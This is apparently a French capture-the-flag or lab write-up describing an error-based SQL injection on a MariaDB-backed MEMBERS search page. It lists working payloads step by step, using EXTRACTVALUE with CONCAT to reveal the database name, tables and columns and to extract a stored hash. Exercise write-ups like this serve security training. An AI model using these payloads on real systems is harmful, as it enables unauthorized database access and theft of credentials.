1. Description de la vulnérabilité
Cible : Page MEMBERS

Vecteur : Champ de recherche (id)

Type de faille : SQL Injection (Error Based - MariaDB)

Analyse du contournement
Lors de l'étape de détection, nous avons remarqué que l'utilisation d'une apostrophe ' provoquait une erreur mais était "échappée" par le serveur (affichage d'un backslash \). Le succès de l'attaque repose sur le fait que le champ attend une valeur numérique. En injectant des commandes SQL sans apostrophes, nous contournons totalement la protection addslashes ou équivalente du serveur.

2. Étapes d'exploitation et Preuves
Étape 1 : Détection
Injection d'un caractère spécial pour casser la requête et confirmer que les erreurs SQL sont affichées.

Payload : '

Résultat : Erreur de syntaxe MariaDB.

Preuve : [screenshots/01_syntax_error.png]

Étape 2 : Énumération de la Base de Données
Utilisation de la fonction EXTRACTVALUE pour forcer l'affichage du nom de la base dans le message d'erreur.

Payload : 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))

Résultat : ~Member_Sql_Injection~

Preuve : [screenshots/02_database_name.png]

Étape 3 : Énumération de la Table
Recherche des tables appartenant à la base de données identifiée.

Payload : 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), 0x7e))

Résultat : ~users~

Preuve : [screenshots/03_table_name.png]

Étape 4 : Énumération des Colonnes (Méthode par Offset)
Comme l'affichage est limité à un résultat par erreur, nous avons énuméré les colonnes une par une en augmentant l'OFFSET. Nous avons ainsi découvert les colonnes inutiles (user_id, town, planet, Commentaire, etc.) avant d'identifier la colonne sensible.

Payload (Offset 7) : 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 1 OFFSET 7), 0x7e))

Résultat : ~countersign~ (Colonne contenant les hashs).

Preuve : [screenshots/04_column_countersign.png]

Étape 5 : Extraction du Flag
Extraction finale du contenu de la colonne countersign.

Payload : 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT substring(countersign, 1, 64) FROM users LIMIT 1), 0x7e))

Résultat : 2b3366bcfd44f540e630d4dc2b9b06d9

Preuve : [screenshots/05_final_flag.png]
